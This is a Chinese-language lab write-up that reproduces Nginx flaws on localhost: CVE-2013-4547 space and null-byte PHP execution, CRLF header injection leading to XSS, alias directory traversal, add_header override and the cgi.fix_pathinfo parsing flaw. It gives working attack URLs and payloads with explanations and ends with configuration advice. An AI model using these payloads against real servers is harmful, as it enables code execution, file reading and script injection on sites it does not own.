### CVE-2013-4547

复现过程

向服务器上传一个写有php代码的**2.jpg ** （注意，jpg后面是有空格的，这是漏洞利用的关键）

![1566481629127](\images\1566481629127.png)

![1566481446323](\images\1566481446323.png)

访问**127.0.0.1:8080/uploadfiles/2.jpg \0.php**，注意空格和截止符不要编码，所以我们访问**127.0.0.1:8080/uploadfiles/2.jpg...php**，再bp抓包修改

![1566481785690](\images\1566481785690.png)

![1566482042534](\images\1566482042534.png)

可以看到，成功执行php代码

![1566482109324](\images\1566482109324.png)

这是为什么呢？

简单的说：**就是非法空字符和截止符导致Nginx解析URL时的有限状态机混乱，造成允许攻击者通过一个非编码空格绕过后缀名限制**

详细原因：[http://www.91ri.org/9064.html](http://www.91ri.org/9064.html)

也就是说，刚才访问URL

```
127.0.0.1:8080/uploadfiles/2.jpg \0.php
```

**Nginx会把2.jpg的后缀认为是.php**，所以执行php代码

这样还能绕过访问限制

设置禁止访问admin文件夹

![1566485298217](\images\1566485298217.png)

在admin文件夹下创建一个admin.php

```php
<?php
echo "I am admin";    
?>
```

尝试浏览器访问

![1566485234502](\images\1566485234502.png)

在网站目录新建一个**“test ”**的文件夹，后面是有空格的

再尝试访问

```
http://127.0.0.1:8080/test /../admin/admin.php
```

就可以访问成功

不过在测试并没有成执行admin.php，只返回一个**404 file not found**

---

### 配置错误导致漏洞

**1、CRLF注入漏洞**

如果在nginx想要强制http转https，而配置文件却如下

```
location / {
    return 302 https://$host$uri;
}
```

Nginx会将`$uri`进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞

payload1

```
http://127.0.0.1:8080/%0a%0dSet-Cookie:a=1
```

![1566528663588](\images\1566528663588.png)

P神的《[Bottle HTTP 头注入漏洞探究](https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html)》，利用里面的技巧可以实现XSS

payload2

```
http://127.0.0.1:8080/%0a%0dX-XSS-Protection:0%0a%0d%0a%0d%0a%0d<script>alert(location.href)</script>
```

![1566529151959](\images\1566529151959.png)

---

**2、目录穿越**

为了能让用户访问到指定文件夹，通常使用**root**或**alias**来配置

如果在配置Alias的时候，忘记加 **/** ,将会造成目录穿越漏洞

```
location /files {
    alias /home/;
}
```

访问

```
http://127.0.0.1:8081/files/
```

![1566529808873](\images\1566529808873.png)

访问

```
http://127.0.0.1:8081/files../
```



![1566529848955](\images\1566529848955.png)

漏洞利用有限，只能跳到上一层目录，读取上一层目录及其任意子目录的文件，不能任意目录遍历读取任意文件。

不过nginx默认没有开启目录浏览，当下面配置加入到nginx配置文件的server段内后可导致目录浏览。

```
autoindex on;                        #开启目录浏览
autoindex_exact_size off;            #显示文件大小（单位K/M/G）
autoindex_localtime on;              #显示修改时间
charset utf-8,gbk;                   #设置编码
```

---

**3、add_header被覆盖**

如果在nginx配置文件中的**子块（server，location，if）**添加请求头，就会**覆盖掉父块**的中**add_heade**中添加的HTTP头，可能会造成一些安全隐患。

```
add_header Content-Security-Policy "default-src 'self'";
add_header X-Frame-Options DENY; 	#父块添加请求头

location = /test1 {
    rewrite ^(.*)$ /xss.html break;
}

location = /test2 {
    add_header X-Content-Type-Options nosniff; 	#子块添加请求头
    rewrite ^(.*)$ /xss.html break;
}
```

如上，在子块/test2的location中有添加 **X-Content-Type-Options**，会造成父块的所有**add_header**失效

访问

```
http://127.0.0.1:8082
```



![1566531475618](\images\1566531475618.png)

父块设置请求头正常

访问

```
http://127.0.0.1:8082/test2
```

![1566531597321](\images\1566531597321.png)

父块设置请求头全部失效，只剩/test2设置的请求头

这样就会被攻击者利用，比如XSS

```
http://127.0.0.1:8082/test2#<script>alert(1)</script>
```

不过在新版浏览器中，这种类型XSS难以实现

![1566532368315](\images\1566532368315.png)

---

**4、解析漏洞**

准备一个**1.jpg**文件放在网站目录下，内容如下

```
<?php
phpinfo();
?>
```

尝试访问

```
http://127.0.0.1:8080/1.jpg
```

不出意料的显示错误

![1566549376989](\images\1566549376989.png)

这次在后面加个**1.php**

```
127.0.0.1:8080/1.jpg/1.php
```

执行了php代码，得到**phpinfo**界面

![1566549555529](\images\1566549555529.png)

事实上网站目录下并没有1.php这个文件，为什么会解析？

Nginx在得到URL之后，会去检查，如果发现后缀是**.php**，便认为是php文件，就交给php去处理。

php一检查，发现并没1.php这个东西，就**删除/1.php**，再往前检查，发现1.jpg存在，就把1.jpg当做要执行的文件，造成解析漏洞。

我们可以尝试填加多个不存在文件看他是否是一样会解析

```
http://127.0.0.1:8080/1.jpg/1.png/1.gif/1.php
```

果然解析成功

![1566550123967](\images\1566550123967.png)

上面两个例子能解析成功，得益于php一个功能**cgi.fix_pathinfo**

在php配置文件中

```
cgi.fix_pathinfo=1
```

表示该功能开启（默认开启）

从名字上看，就能猜测一二该配置的作用：“**修理路径**”

拿上面请求URL

```
http://127.0.0.1:8080/1.jpg/1.png/1.gif/1.php
```

按照正常解析，我们要访问的文件应该是**/1.jpg/1.png/1.gif/1.php**，但1.php不存在，这时php的“修理”功能就修理该路径，**去掉/1.php**，再检查**/1.jpg/1.png/1.gif**，但1.gif也不存在，再次去掉**/1.gif**，以此类推，直到执行或报错。

不过在高版本的php中引入了**“security.limit_extensions”**，默认限制php**执行后缀为.php**。在**php-fpm.conf**可找到该配置

```
  security.limit_extensions = .php .jpg
```

这样配置才能成功执行，否则即使检测到1.jpg存在，也会因为它的后缀是.jpg而无法执行，得到**“Access denied”**异常。

我的能执行，完全是因为我连php-fpm都没安装。。。。。

对比隔壁家**Apache**等，会先看该文件是否存在，若存在则再决定该如何处理。

---

### 总结

可以看到，Nginx绝大多数漏洞产生的原因是**用户配置不当**。想要防止漏洞，就要在配置文件的时候多下点功夫。

---

### 参考文章

- https://blog.csdn.net/jishuzhain/article/details/84791532
- https://blog.werner.wiki/file-resolution-vulnerability-nginx/